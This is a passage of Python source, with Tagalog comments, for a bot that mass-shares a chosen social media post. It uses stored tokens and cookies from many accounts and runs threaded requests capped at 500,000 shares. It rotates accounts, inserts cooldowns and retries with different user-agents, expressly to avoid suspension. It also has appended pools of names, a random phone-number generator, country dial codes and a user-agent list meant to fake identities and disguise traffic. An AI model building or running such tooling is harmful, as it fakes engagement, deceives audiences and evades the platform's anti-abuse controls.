                    print(nika_color(f"Video/reel error (attempt {attempt+1}), retrying with different UA and longer delay...", '91'))
                    sleep(3)  # Extra delay for video/reel issues
                    continue
                else:
                    logging.error(f"API error for token {token[:10]}...: {data}")
                    print(nika_color(f"Failed: {data}", '91'))  # Red
                    return False  # Failed
        except requests.exceptions.ConnectionError as e:
            logging.error(f"Connection error for token {token[:10]}...: {e}")
            print(nika_color(f"Connection error (attempt {attempt+1}), retrying...", '91'))
        except requests.exceptions.Timeout as e:
            logging.error(f"Timeout error for token {token[:10]}...: {e}")
            print(nika_color(f"Timeout error (attempt {attempt+1}), retrying...", '91'))
        except json.JSONDecodeError as e:
            logging.error(f"JSON decode error for token {token[:10]}...: {e}")
            print(nika_color(f"JSON error (attempt {attempt+1}), retrying...", '91'))
        except Exception as e:
            logging.error(f"Unexpected error for token {token[:10]}...: {e}")
            print(nika_color(f"Unexpected error (attempt {attempt+1}): {e}", '91'))
        
        # Exponential backoff: 5s, 10s, 20s, 40s, 80s, etc., up to 20 retries, cap at 15 minutes for fresh accounts
        backoff_time = min(5 * (2 ** attempt), 900)  # Cap at 15 minutes
        print(nika_color(f"Retrying in {backoff_time}s...", '93'))
        sleep(backoff_time)
    
    # After all retries, mark as failed
    failed_accounts.add(token)
    return False

def nika_bot():
    os.system("clear")
    nika_banner()
    try:
        with open("tokens.txt", "r") as f:
            tokens = json.load(f)
        with open("cookies.txt", "r") as f:
            cookies_list = json.load(f)
    except Exception as e:
        logging.error(f"File load error: {e}")
        if os.path.exists("tokens.txt"): os.remove("tokens.txt")
        if os.path.exists("cookies.txt"): os.remove("cookies.txt")
        print(nika_color("Wala na expired na cookies mo ugok.", '91'))  # Red
        return nika_login()

    account_shares = {token: 0 for token in tokens}  # Track shares per account
    failed_accounts = set()  # Track failed accounts

    while True:
        link = input(nika_color("Link ng post mo ugok! (supports video/reel URLs): ", '96'))  # Cyan, added note
        try:
            limitasyon = int(input(nika_color("limitasyon ng share (infinite share): ", '96')))  # Cyan
            if limitasyon > 500000:
                limitasyon = 500000  # Cap to prevent abuse
        except ValueError:
            print(nika_color("Limitasyon dapat number, hindi kalokohan.", '91'))
            continue

        print(nika_color("Nag loading pa ngani antay ha antay sapakin kita e", '93'))  # Yellow
        start_time = datetime.now()
        success_count = 0
        fail_count = 0

        # Controlled concurrent sharing with 0.1s delay, 10s cooldown every 60 shares, and account limits to avoid suspension (optimized for fresh/new accounts and single cookie)
        with ThreadPoolExecutor(max_workers=3) as executor:  # Increased workers for faster sharing
            futures = []
            for n in range(1, limitasyon + 1):
                # Select token with least shares, avoiding failed ones (back to 60 for faster sharing like previous)
                available_tokens = [t for t in tokens if account_shares[t] < 60 and t not in failed_accounts]  # Back to 60 for speed
                if not available_tokens:
                    print(nika_color("All available accounts reached 60 shares limit or failed. Pausing for 10 seconds...", '91'))
                    sleep(10)  # Changed to 10 seconds as requested
                    account_shares = {token: 0 for token in tokens if token not in failed_accounts}  # Reset non-failed
                    available_tokens = [t for t in tokens if t not in failed_accounts]
                    if not available_tokens:
                        print(nika_color("No working accounts left. Returning to menu.", '91'))
                        return nika_main()
                token = random.choice(available_tokens)
                cookie = cookies_list[tokens.index(token)]
                futures.append(executor.submit(nika_share_post, token, cookie, link, n, start_time, account_shares, failed_accounts))
                
                sleep(0.1)  # 0.1 seconds delay per share for fast sharing
                
                # Cooldown every 60 shares: 10 seconds (changed from 6 to 10 as requested)
                if n % 60 == 0:
                    print(nika_color(f"Cooldown: Waiting 10 seconds after {n} shares...", '93'))  # Yellow
                    sleep(10)

            # Wait for all to complete and count results
            for future in as_completed(futures):
                try:
                    if future.result():
                        success_count += 1
                    else:
                        fail_count += 1
                except Exception as e:
                    logging.error(f"Future result error: {e}")
                    fail_count += 1

        print(nika_color(f"Done! All shares sent.  Success: {success_count}  |  Failed: {fail_count}", '92'))

        # After sharing, ask continue/exit
        choice = input(nika_color("continue/exit? ", '96')).lower()
        if choice == "exit":
            nika_main(); return
        elif choice == "continue":
            continue  # Loop back to input link
        else:
            print(nika_color("Invalid choice, defaulting to continue.", '91'))
  # ============================================================
  # ============================================================
  #
  #   ███████╗██╗  ██╗████████╗███████╗███╗   ██╗███████╗██╗ ██████╗ ███╗   ██╗███████╗
  #   ██╔════╝╚██╗██╔╝╚══██╔══╝██╔════╝████╗  ██║██╔════╝██║██╔═══██╗████╗  ██║██╔════╝
  #   █████╗   ╚███╔╝    ██║   █████╗  ██╔██╗ ██║███████╗██║██║   ██║██╔██╗ ██║███████╗
  #   ██╔══╝   ██╔██╗    ██║   ██╔══╝  ██║╚██╗██║╚════██║██║██║   ██║██║╚██╗██║╚════██║
  #   ███████╗██╔╝ ██╗   ██║   ███████╗██║ ╚████║███████║██║╚██████╔╝██║ ╚████║███████║
  #   ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═══╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝
  #
  #   EXTENSION BLOCK  —  Names | UA Pool | Phone Prefixes | Country Codes
  #   Cookie Tools | Account Storage | UI Helpers | 80+ Utility Functions
  #
  # ============================================================
  # ============================================================


  # ============================================================
  #  EXTENDED NAME POOL
  # ============================================================

_EXT_MALE_NAMES = [
    "Aiden", "Aaron", "Abraham", "Adam", "Adrian", "Ahmad", "Ahmed", "Alan",
  "Albert", "Alejandro", "Alex", "Alexander", "Alexis", "Alfonso", "Alfred", "Ali",
  "Allen", "Alvin", "Amir", "Andre", "Andrew", "Angel", "Angelo", "Anthony",
  "Antonio", "Arjun", "Armando", "Arnold", "Arthur", "Arvind", "Austin", "Axel",
  "Ayaan", "Ayden", "Aziz", "Benjamin", "Bernard", "Blake", "Bradley", "Brady",
  "Brandon", "Brayden", "Brendan", "Brett", "Brian", "Bruce", "Bryan", "Caleb",
  "Calvin", "Cameron", "Carl", "Carlos", "Casey", "Cedric", "Chad", "Charles",
  "Charlie", "Christian", "Christopher", "Clarence", "Clark", "Clayton", "Clinton", "Cody",
  "Colton", "Connor", "Corey", "Craig", "Curtis", "Damian", "Daniel", "Dario",
  "Darren", "David", "Dean", "Declan", "Derek", "Devon", "Dexter", "Diego",
  "Dillon", "Dominic", "Donald", "Douglas", "Drake", "Duncan", "Dylan", "Earl",
  "Edgar", "Edison", "Eduardo", "Edward", "Edwin", "Elias", "Elijah", "Elliot",
  "Emanuel", "Emilio", "Emmanuel", "Eric", "Ernest", "Ethan", "Eugene", "Evan",
  "Ezra", "Fabian", "Felix", "Fernando", "Finn", "Fredrick", "Gabriel", "Garrett",
  "Gavin", "George", "Gerald", "Gilbert", "Glen", "Gordon", "Graham", "Grant",
  "Grayson", "Gregory", "Griffin", "Gustavo", "Henry", "Hunter", "Ian", "Ibrahim",
  "Isaac", "Isaiah", "Ivan", "Jackson", "Jacob", "Jaden", "James", "Jasper",
  "Javier", "Jay", "Jayden", "Jeremy", "Jerome", "Jesse", "Joel", "John",
  "Jonah", "Jonathan", "Jordan", "Jose", "Joseph", "Joshua", "Julian", "Justin",
  "Kai", "Kaito", "Kameron", "Karl", "Kenneth", "Kevin", "Kyle", "Landon",
  "Lawrence", "Levi", "Liam", "Logan", "Lucas", "Luis", "Luke", "Marcus",
  "Mario", "Martin", "Mason", "Matthew", "Maximus", "Michael", "Miguel", "Miles",
  "Nathan", "Nicholas", "Noah", "Nolan", "Oliver", "Omar", "Owen", "Patrick",
  "Paul", "Peter", "Philip", "Preston", "Rafael", "Raymond", "Ricardo", "Richard",
  "Robert", "Roman", "Ronald", "Rowan", "Russell", "Ryan", "Samuel", "Scott",
  "Sebastian", "Seth", "Shawn", "Simon", "Stefan", "Stephen", "Steven", "Thomas",
  "Timothy", "Travis", "Trevor", "Tristan", "Tyler", "Victor", "Vincent", "Wayne",
  "Wesley", "William", "Wyatt", "Xavier", "Yusuf", "Zachary", "Zane", "Muhammad",
  "Abdullah", "Hassan", "Hussein", "Khalid", "Tariq", "Youssef", "Kareem", "Bilal",
  "Imran", "Faisal", "Majid", "Rami", "Sami", "Nasser", "Adnan", "Ayman",
  "Bashir", "Dawood", "Farhan", "Ghani", "Hadi", "Iqbal", "Jabir", "Kamil",
  "Leon", "Luca", "Matteo", "Marco", "Lorenzo", "Giacomo", "Stefano", "Davide",
  "Simone", "Riku", "Sota", "Haruto", "Yuto", "Sora", "Ren", "Hiroto",
  "Yusei", "Daiki", "Wei", "Chen", "Ming", "Hao", "Lei", "Jie",
  "Tao", "Jun", "Xiang", "Peng", "Raj", "Rahul", "Ravi", "Rohit",
  "Rohan", "Amit", "Anil", "Ashok", "Budi", "Dimas", "Rizky", "Hendra",
  "Rendi", "Wahyu", "Yoga", "Kwame", "Kofi", "Chidi", "Emeka", "Tunde",
  "Seun", "Sipho", "Thabo", "Mandla", "Bongani", "Siyanda", "Lwazi", "Nhlanhla",
  "Sibusiso", "Sandile", "Rene", "Gustave", "Marcel", "Florian", "Thierry", "Arnaud",
  "Bruno", "Damien", "Franck", "Herve", "Laurent", "Nicolas", "Olivier", "Pascal",
  "Philippe", "Pierre", "Stephane", "Xavier2", "Yann", "Alexei", "Andrei", "Boris",
  "Dmitri", "Evgeny", "Fyodor", "Grigory", "Igor", "Kirill", "Maxim", "Mikhail",
  "Nikita", "Oleg", "Pavel", "Sergei", "Valentin", "Vasily", "Viktor", "Vladimir",
  "Yuri",
]

_EXT_FEMALE_NAMES = [
    "Aaliyah", "Abby", "Abigail", "Ada", "Adeline", "Adriana", "Aisha", "Alexa",
  "Alexandria", "Alice", "Alicia", "Alina", "Alisha", "Alison", "Allison", "Alyssa",
  "Amanda", "Amber", "Amelia", "Amina", "Amy", "Anastasia", "Andrea", "Angela",
  "Angelica", "Angelina", "Anita", "Ann", "Anna", "Annabelle", "Annika", "Aria",
  "Ariana", "Ashley", "Audrey", "Aurora", "Ava", "Avery", "Ayesha", "Beatrice",
  "Bella", "Bethany", "Beverly", "Bianca", "Brenda", "Brianna", "Bridget", "Brittany",
  "Brooke", "Camila", "Candice", "Carmen", "Caroline", "Cassandra", "Catherine", "Charlotte",
  "Chelsea", "Chloe", "Christina", "Christine", "Cindy", "Claire", "Claudia", "Cora",
  "Crystal", "Daisy", "Dana", "Daniela", "Daphne", "Dawn", "Deborah", "Denise",
  "Diana", "Elena", "Elisa", "Elise", "Eliza", "Elizabeth", "Ella", "Ellie",
  "Emily", "Emma", "Erica", "Erin", "Eva", "Evelyn", "Fatima", "Felicia",
  "Fernanda", "Fiona", "Florence", "Frances", "Freya", "Gabriela", "Gemma", "Georgia",
  "Grace", "Hailey", "Hannah", "Harriet", "Heather", "Helen", "Holly", "Isabel",
  "Isabella", "Isabelle", "Jade", "Jasmine", "Jennifer", "Jessica", "Joanna", "Julia",
  "Julianna", "Julie", "Juliet", "Kaitlyn", "Karen", "Katelyn", "Katherine", "Kathleen",
  "Katie", "Katrina", "Kayla", "Kelly", "Kimberly", "Kristen", "Kristina", "Laura",
  "Lauren", "Layla", "Leah", "Leila", "Lily", "Linda", "Lisa", "Lola",
  "Lorena", "Lori", "Louise", "Lucy", "Luna", "Lydia", "Mackenzie", "Madeline",
  "Madison", "Maria", "Mariana", "Marie", "Marina", "Mary", "Maya", "Megan",
  "Melissa", "Michelle", "Miranda", "Molly", "Monica", "Morgan", "Nadia", "Nancy",
  "Naomi", "Natalie", "Natasha", "Nicole", "Nina", "Olivia", "Paige", "Pamela",
  "Patricia", "Paula", "Penelope", "Priya", "Rachel", "Rebecca", "Regina", "Riley",
  "Rosa", "Rose", "Ruby", "Ruth", "Samantha", "Sandra", "Sara", "Sarah",
  "Savannah", "Shannon", "Sharon", "Sheila", "Skylar", "Sofia", "Sophia", "Stephanie",
  "Susan", "Sydney", "Taylor", "Tiffany", "Vanessa", "Victoria", "Violet", "Virginia",
  "Wendy", "Zoe", "Fatimah", "Maryam", "Khadijah", "Zainab", "Ruqayyah", "Asma",
  "Noor", "Hana", "Rania", "Salma", "Yasmin", "Dina", "Lina", "Rana",
  "Sana", "Mei", "Yuki", "Hina", "Saki", "Nana", "Rin", "Yui",
  "Moe", "Ayaka", "Riko", "Min", "Ling", "Jing", "Fang", "Xia",
  "Ying", "Li", "Yan", "Zhen", "Hong", "Priya2", "Deepa", "Ananya",
  "Kavya", "Sneha", "Pooja", "Nisha", "Divya", "Swati", "Tanvi", "Sari",
  "Dewi", "Putri", "Anggi", "Bunga", "Indah", "Nia", "Ratna", "Wulan",
  "Amara", "Chioma", "Adaeze", "Ngozi", "Uju", "Chinyere", "Nkechi", "Blessing",
  "Chika", "Oge", "Ifeoma", "Nomsa", "Zodwa", "Thandi", "Bongiwe", "Nokwanda",
  "Lungile", "Zanele", "Nompumelelo", "Sindisiwe", "Nokukhanya", "Agnes", "Brigitte", "Cecile",
  "Delphine", "Florence2", "Gaelle", "Helene", "Isabelle2", "Joelle", "Karine", "Laure",
  "Marine", "Nathalie", "Ophelie", "Pauline", "Sandrine", "Tatiana", "Ulrike", "Valerie",
  "Wioletta", "Xenia", "Yolande", "Zara",
]

_EXT_ALL_NAMES = _EXT_MALE_NAMES + _EXT_FEMALE_NAMES + SINGLE_NAMES
_EXT_NAME_COUNT = len(_EXT_ALL_NAMES)

def get_ext_name() -> str:
    """Random name from extended global pool."""
    return random.choice(_EXT_ALL_NAMES)

def get_male_name() -> str:
    """Random male name."""
    return random.choice(_EXT_MALE_NAMES)

def get_female_name() -> str:
    """Random female name."""
    return random.choice(_EXT_FEMALE_NAMES)

def get_full_name() -> str:
    """Random full name."""
    return f"{random.choice(_EXT_ALL_NAMES)} {random.choice(_EXT_ALL_NAMES)}"


# ============================================================
#  PHONE PREFIX TABLE
# ============================================================

_PHONE_PREFIXES = {
    'BD': {'code': '+88', 'prefixes': ["017","018","019","016","015"], 'len': 8},
  'PH': {'code': '+63', 'prefixes': ["917","918","919","920","921","922","923","924","925","926"], 'len': 7},
  'IN': {'code': '+91', 'prefixes': ["980","981","982","983","984","985","986","987","988","989"], 'len': 8},
  'PK': {'code': '+92', 'prefixes': ["300","301","302","303","304","305","306","307","308","309"], 'len': 7},
  'ID': {'code': '+62', 'prefixes': ["811","812","813","814","815","816","817","818","819"], 'len': 8},
  'MY': {'code': '+60', 'prefixes': ["11","12","13","14","16","17","18","19"], 'len': 8},
  'TH': {'code': '+66', 'prefixes': ["060","061","062","063","064","065","066","080","081","082"], 'len': 7},
  'VN': {'code': '+84', 'prefixes': ["032","033","034","035","036","037","038","039","056","058"], 'len': 7},
  'KH': {'code': '+855', 'prefixes': ["010","011","012","013","014","015","016","017"], 'len': 6},
  'MM': {'code': '+95', 'prefixes': ["09"], 'len': 9},
  'LK': {'code': '+94', 'prefixes': ["70","71","72","74","75","76","77","78"], 'len': 7},
  'NP': {'code': '+977', 'prefixes': ["980","981","982","984","985"], 'len': 7},
  'NG': {'code': '+234', 'prefixes': ["0802","0803","0804","0805","0806","0807"], 'len': 7},
  'GH': {'code': '+233', 'prefixes': ["020","024","026","027","028"], 'len': 7},
  'KE': {'code': '+254', 'prefixes': ["0700","0701","0702","0703","0710"], 'len': 6},
  'EG': {'code': '+20', 'prefixes': ["010","011","012","015"], 'len': 8},
  'SA': {'code': '+966', 'prefixes': ["050","053","054","055","056","057","058","059"], 'len': 7},
  'AE': {'code': '+971', 'prefixes': ["050","052","054","055","056","058"], 'len': 7},
  'TR': {'code': '+90', 'prefixes': ["530","531","532","533","534","535","536","537","538","539"], 'len': 7},
  'DE': {'code': '+49', 'prefixes': ["151","152","157","159","160","162","163","170","171","172"], 'len': 8},
  'FR': {'code': '+33', 'prefixes': ["06","07"], 'len': 8},
  'GB': {'code': '+44', 'prefixes': ["07400","07500","07600","07700","07800","07900"], 'len': 6},
  'US': {'code': '+1', 'prefixes': ["201","202","203","205","206","207","208","209","210","212","213","214","215","216","217","218","219","220","224","225"], 'len': 7},
  'CA': {'code': '+1', 'prefixes': ["403","416","514","604","647","780","819","902"], 'len': 7},
  'AU': {'code': '+61', 'prefixes': ["04"], 'len': 9},
  'BR': {'code': '+55', 'prefixes': ["11","21","31","41","51","61","71","81"], 'len': 9},
  'MX': {'code': '+52', 'prefixes': ["55","33","81","664","653"], 'len': 8},
  'RU': {'code': '+7', 'prefixes': ["903","906","910","912","916","919","920","921","922","924"], 'len': 7},
  'PL': {'code': '+48', 'prefixes': ["45","50","51","53","57","60","66","69"], 'len': 8},
  'ZA': {'code': '+27', 'prefixes': ["060","061","062","063","064","065","066"], 'len': 7},
  'UA': {'code': '+380', 'prefixes': ["050","063","066","067","068","073"], 'len': 7},
  'JP': {'code': '+81', 'prefixes': ["70","80","90"], 'len': 8},
  'KR': {'code': '+82', 'prefixes': ["010","011","016","017"], 'len': 8},
  'CN': {'code': '+86', 'prefixes': ["130","131","132","133","134","135","136","137","138","139"], 'len': 8},
  'SG': {'code': '+65', 'prefixes': ["8","9"], 'len': 7},
}

def generate_phone_ext(country_code: str = None) -> str:
    """Generate phone number from extended prefix table."""
    if not country_code or country_code not in _PHONE_PREFIXES:
        country_code = random.choice(list(_PHONE_PREFIXES.keys()))
    _d = _PHONE_PREFIXES[country_code]
    _pf = random.choice(_d['prefixes'])
    _sx = ''.join(random.choices('0123456789', k=_d['len']))
    return f"{_d['code']}{_pf}{_sx}"

def generate_random_phone() -> str:
    """Generate phone from any country."""
    return generate_phone_ext(None)


# ============================================================
#  COUNTRY CODE TABLE
# ============================================================

_COUNTRY_CODES = {
    'AD': {'name': 'Andorra', 'dial': '+376'},
  'AE': {'name': 'UAE', 'dial': '+971'},
  'AF': {'name': 'Afghanistan', 'dial': '+93'},
  'AG': {'name': 'Antigua', 'dial': '+1268'},
  'AL': {'name': 'Albania', 'dial': '+355'},
  'AM': {'name': 'Armenia', 'dial': '+374'},
  'AO': {'name': 'Angola', 'dial': '+244'},
  'AR': {'name': 'Argentina', 'dial': '+54'},
  'AT': {'name': 'Austria', 'dial': '+43'},
  'AU': {'name': 'Australia', 'dial': '+61'},
  'AZ': {'name': 'Azerbaijan', 'dial': '+994'},
  'BA': {'name': 'Bosnia', 'dial': '+387'},
  'BB': {'name': 'Barbados', 'dial': '+1246'},
  'BD': {'name': 'Bangladesh', 'dial': '+880'},
  'BE': {'name': 'Belgium', 'dial': '+32'},
  'BF': {'name': 'BurkinaFaso', 'dial': '+226'},
  'BG': {'name': 'Bulgaria', 'dial': '+359'},
  'BH': {'name': 'Bahrain', 'dial': '+973'},
  'BI': {'name': 'Burundi', 'dial': '+257'},
  'BJ': {'name': 'Benin', 'dial': '+229'},
  'BN': {'name': 'Brunei', 'dial': '+673'},
  'BO': {'name': 'Bolivia', 'dial': '+591'},
  'BR': {'name': 'Brazil', 'dial': '+55'},
  'BS': {'name': 'Bahamas', 'dial': '+1242'},
  'BT': {'name': 'Bhutan', 'dial': '+975'},
  'BW': {'name': 'Botswana', 'dial': '+267'},
  'BY': {'name': 'Belarus', 'dial': '+375'},
  'BZ': {'name': 'Belize', 'dial': '+501'},
  'CA': {'name': 'Canada', 'dial': '+1'},
  'CD': {'name': 'DemRepCongo', 'dial': '+243'},
  'CF': {'name': 'CentralAfrican', 'dial': '+236'},
  'CG': {'name': 'Congo', 'dial': '+242'},
  'CH': {'name': 'Switzerland', 'dial': '+41'},
  'CI': {'name': 'CotedIvoire', 'dial': '+225'},
  'CL': {'name': 'Chile', 'dial': '+56'},
  'CM': {'name': 'Cameroon', 'dial': '+237'},
  'CN': {'name': 'China', 'dial': '+86'},
  'CO': {'name': 'Colombia', 'dial': '+57'},
  'CR': {'name': 'CostaRica', 'dial': '+506'},
  'CU': {'name': 'Cuba', 'dial': '+53'},
  'CV': {'name': 'CaboVerde', 'dial': '+238'},
  'CY': {'name': 'Cyprus', 'dial': '+357'},
  'CZ': {'name': 'CzechRepublic', 'dial': '+420'},
  'DE': {'name': 'Germany', 'dial': '+49'},
  'DJ': {'name': 'Djibouti', 'dial': '+253'},
  'DK': {'name': 'Denmark', 'dial': '+45'},
  'DM': {'name': 'Dominica', 'dial': '+1767'},
  'DO': {'name': 'DominicanRepublic', 'dial': '+1849'},
  'DZ': {'name': 'Algeria', 'dial': '+213'},
  'EC': {'name': 'Ecuador', 'dial': '+593'},
  'EE': {'name': 'Estonia', 'dial': '+372'},
  'EG': {'name': 'Egypt', 'dial': '+20'},
  'ER': {'name': 'Eritrea', 'dial': '+291'},
  'ES': {'name': 'Spain', 'dial': '+34'},
  'ET': {'name': 'Ethiopia', 'dial': '+251'},
  'FI': {'name': 'Finland', 'dial': '+358'},
  'FJ': {'name': 'Fiji', 'dial': '+679'},
  'FR': {'name': 'France', 'dial': '+33'},
  'GA': {'name': 'Gabon', 'dial': '+241'},
  'GB': {'name': 'UnitedKingdom', 'dial': '+44'},
  'GD': {'name': 'Grenada', 'dial': '+1473'},
  'GE': {'name': 'Georgia', 'dial': '+995'},
  'GH': {'name': 'Ghana', 'dial': '+233'},
  'GM': {'name': 'Gambia', 'dial': '+220'},
  'GN': {'name': 'Guinea', 'dial': '+224'},
  'GQ': {'name': 'EquatorialGuinea', 'dial': '+240'},
  'GR': {'name': 'Greece', 'dial': '+30'},
  'GT': {'name': 'Guatemala', 'dial': '+502'},
  'GW': {'name': 'GuineaBissau', 'dial': '+245'},
  'GY': {'name': 'Guyana', 'dial': '+592'},
  'HK': {'name': 'HongKong', 'dial': '+852'},
  'HN': {'name': 'Honduras', 'dial': '+504'},
  'HR': {'name': 'Croatia', 'dial': '+385'},
  'HT': {'name': 'Haiti', 'dial': '+509'},
  'HU': {'name': 'Hungary', 'dial': '+36'},
  'ID': {'name': 'Indonesia', 'dial': '+62'},
  'IE': {'name': 'Ireland', 'dial': '+353'},
  'IL': {'name': 'Israel', 'dial': '+972'},
  'IN': {'name': 'India', 'dial': '+91'},
  'IQ': {'name': 'Iraq', 'dial': '+964'},
  'IR': {'name': 'Iran', 'dial': '+98'},
  'IS': {'name': 'Iceland', 'dial': '+354'},
  'IT': {'name': 'Italy', 'dial': '+39'},
  'JM': {'name': 'Jamaica', 'dial': '+1876'},
  'JO': {'name': 'Jordan', 'dial': '+962'},
  'JP': {'name': 'Japan', 'dial': '+81'},
  'KE': {'name': 'Kenya', 'dial': '+254'},
  'KG': {'name': 'Kyrgyzstan', 'dial': '+996'},
  'KH': {'name': 'Cambodia', 'dial': '+855'},
  'KI': {'name': 'Kiribati', 'dial': '+686'},
  'KM': {'name': 'Comoros', 'dial': '+269'},
  'KP': {'name': 'NorthKorea', 'dial': '+850'},
  'KR': {'name': 'SouthKorea', 'dial': '+82'},
  'KW': {'name': 'Kuwait', 'dial': '+965'},
  'KZ': {'name': 'Kazakhstan', 'dial': '+7'},
  'LA': {'name': 'Laos', 'dial': '+856'},
  'LB': {'name': 'Lebanon', 'dial': '+961'},
  'LI': {'name': 'Liechtenstein', 'dial': '+423'},
  'LK': {'name': 'SriLanka', 'dial': '+94'},
  'LR': {'name': 'Liberia', 'dial': '+231'},
  'LS': {'name': 'Lesotho', 'dial': '+266'},
  'LT': {'name': 'Lithuania', 'dial': '+370'},
  'LU': {'name': 'Luxembourg', 'dial': '+352'},
  'LV': {'name': 'Latvia', 'dial': '+371'},
  'LY': {'name': 'Libya', 'dial': '+218'},
  'MA': {'name': 'Morocco', 'dial': '+212'},
  'MC': {'name': 'Monaco', 'dial': '+377'},
  'MD': {'name': 'Moldova', 'dial': '+373'},
  'ME': {'name': 'Montenegro', 'dial': '+382'},
  'MG': {'name': 'Madagascar', 'dial': '+261'},
  'MK': {'name': 'Macedonia', 'dial': '+389'},
  'ML': {'name': 'Mali', 'dial': '+223'},
  'MM': {'name': 'Myanmar', 'dial': '+95'},
  'MN': {'name': 'Mongolia', 'dial': '+976'},
  'MO': {'name': 'Macau', 'dial': '+853'},
  'MR': {'name': 'Mauritania', 'dial': '+222'},
  'MT': {'name': 'Malta', 'dial': '+356'},
  'MU': {'name': 'Mauritius', 'dial': '+230'},
  'MV': {'name': 'Maldives', 'dial': '+960'},
  'MW': {'name': 'Malawi', 'dial': '+265'},
  'MX': {'name': 'Mexico', 'dial': '+52'},
  'MY': {'name': 'Malaysia', 'dial': '+60'},
  'MZ': {'name': 'Mozambique', 'dial': '+258'},
  'NA': {'name': 'Namibia', 'dial': '+264'},
  'NE': {'name': 'Niger', 'dial': '+227'},
  'NG': {'name': 'Nigeria', 'dial': '+234'},
  'NI': {'name': 'Nicaragua', 'dial': '+505'},
  'NL': {'name': 'Netherlands', 'dial': '+31'},
  'NO': {'name': 'Norway', 'dial': '+47'},
  'NP': {'name': 'Nepal', 'dial': '+977'},
  'NR': {'name': 'Nauru', 'dial': '+674'},
  'NZ': {'name': 'NewZealand', 'dial': '+64'},
  'OM': {'name': 'Oman', 'dial': '+968'},
  'PA': {'name': 'Panama', 'dial': '+507'},
  'PE': {'name': 'Peru', 'dial': '+51'},
  'PG': {'name': 'PapuaNewGuinea', 'dial': '+675'},
  'PH': {'name': 'Philippines', 'dial': '+63'},
  'PK': {'name': 'Pakistan', 'dial': '+92'},
  'PL': {'name': 'Poland', 'dial': '+48'},
  'PS': {'name': 'Palestine', 'dial': '+970'},
  'PT': {'name': 'Portugal', 'dial': '+351'},
  'PW': {'name': 'Palau', 'dial': '+680'},
  'PY': {'name': 'Paraguay', 'dial': '+595'},
  'QA': {'name': 'Qatar', 'dial': '+974'},
  'RO': {'name': 'Romania', 'dial': '+40'},
  'RS': {'name': 'Serbia', 'dial': '+381'},
  'RU': {'name': 'Russia', 'dial': '+7'},
  'RW': {'name': 'Rwanda', 'dial': '+250'},
  'SA': {'name': 'SaudiArabia', 'dial': '+966'},
  'SB': {'name': 'SolomonIslands', 'dial': '+677'},
  'SC': {'name': 'Seychelles', 'dial': '+248'},
  'SD': {'name': 'Sudan', 'dial': '+249'},
  'SE': {'name': 'Sweden', 'dial': '+46'},
  'SG': {'name': 'Singapore', 'dial': '+65'},
  'SI': {'name': 'Slovenia', 'dial': '+386'},
  'SK': {'name': 'Slovakia', 'dial': '+421'},
  'SL': {'name': 'SierraLeone', 'dial': '+232'},
  'SM': {'name': 'SanMarino', 'dial': '+378'},
  'SN': {'name': 'Senegal', 'dial': '+221'},
  'SO': {'name': 'Somalia', 'dial': '+252'},
  'SR': {'name': 'Suriname', 'dial': '+597'},
  'SS': {'name': 'SouthSudan', 'dial': '+211'},
  'SV': {'name': 'ElSalvador', 'dial': '+503'},
  'SY': {'name': 'Syria', 'dial': '+963'},
  'SZ': {'name': 'Swaziland', 'dial': '+268'},
  'TD': {'name': 'Chad', 'dial': '+235'},
  'TG': {'name': 'Togo', 'dial': '+228'},
  'TH': {'name': 'Thailand', 'dial': '+66'},
  'TJ': {'name': 'Tajikistan', 'dial': '+992'},
  'TL': {'name': 'TimorLeste', 'dial': '+670'},
  'TM': {'name': 'Turkmenistan', 'dial': '+993'},
  'TN': {'name': 'Tunisia', 'dial': '+216'},
  'TO': {'name': 'Tonga', 'dial': '+676'},
  'TR': {'name': 'Turkey', 'dial': '+90'},
  'TT': {'name': 'TrinidadTobago', 'dial': '+1868'},
  'TW': {'name': 'Taiwan', 'dial': '+886'},
  'TZ': {'name': 'Tanzania', 'dial': '+255'},
  'UA': {'name': 'Ukraine', 'dial': '+380'},
  'UG': {'name': 'Uganda', 'dial': '+256'},
  'US': {'name': 'UnitedStates', 'dial': '+1'},
  'UY': {'name': 'Uruguay', 'dial': '+598'},
  'UZ': {'name': 'Uzbekistan', 'dial': '+998'},
  'VE': {'name': 'Venezuela', 'dial': '+58'},
  'VN': {'name': 'Vietnam', 'dial': '+84'},
  'VU': {'name': 'Vanuatu', 'dial': '+678'},
  'WS': {'name': 'Samoa', 'dial': '+685'},
  'YE': {'name': 'Yemen', 'dial': '+967'},
  'ZA': {'name': 'SouthAfrica', 'dial': '+27'},
  'ZM': {'name': 'Zambia', 'dial': '+260'},
  'ZW': {'name': 'Zimbabwe', 'dial': '+263'},
}
_COUNTRY_LIST = list(_COUNTRY_CODES.keys())

def get_country_name(code: str) -> str:
    return _COUNTRY_CODES.get(code.upper(), {}).get('name', 'Unknown')

def get_dial_code(code: str) -> str:
    return _COUNTRY_CODES.get(code.upper(), {}).get('dial', '')

def random_country() -> str:
    return random.choice(_COUNTRY_LIST)


# ============================================================
#  STATIC USER-AGENT POOL  (500 entries)
# ============================================================

_STATIC_UA_POOL = [
    "Mozilla/5.0 (Linux; Android 9; SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.1003.51 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.1020.58 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.1037.65 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.1054.72 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.1071.79 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 14; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.1088.86 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 9; SM-A125F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.1105.93 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; SM-A135F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.1122.100 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; SM-A215U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.1139.107 Mobile Safari/537.36",
